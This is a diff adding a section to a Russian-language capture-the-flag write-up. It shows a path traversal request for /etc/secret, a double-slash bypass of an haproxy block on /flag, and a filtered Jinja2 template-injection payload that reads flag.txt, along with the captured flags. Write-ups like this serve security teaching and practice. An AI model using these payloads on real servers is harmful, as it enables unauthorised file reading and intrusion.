@@ -30,3 +30,15 @@ download?file_type=../../../../../../../../../etc/secret
 ```
 
 Флаг: `nto{abobovichasdfas}`
+
+### WEB 3
+
+На эндпоинте `/flag` видим 403 ошибку. Заходим в исходники и находим `haproxy`. Пробуем дефолтные байпассы, сработал, например, `//flag`.
+
+Далее фильтруемая `SSTI` в `Jinja2`. Гуглим хактриксы и вводим:
+
+```
+//flag?name={{(request|attr(request.args.c))._load_form_data.__globals__.__builtins__.open(%22flag.txt%22).read()}}&c=__class__
+```
+
+Флаг: `nto{Ht1P_sM088Lin6_88Ti}`
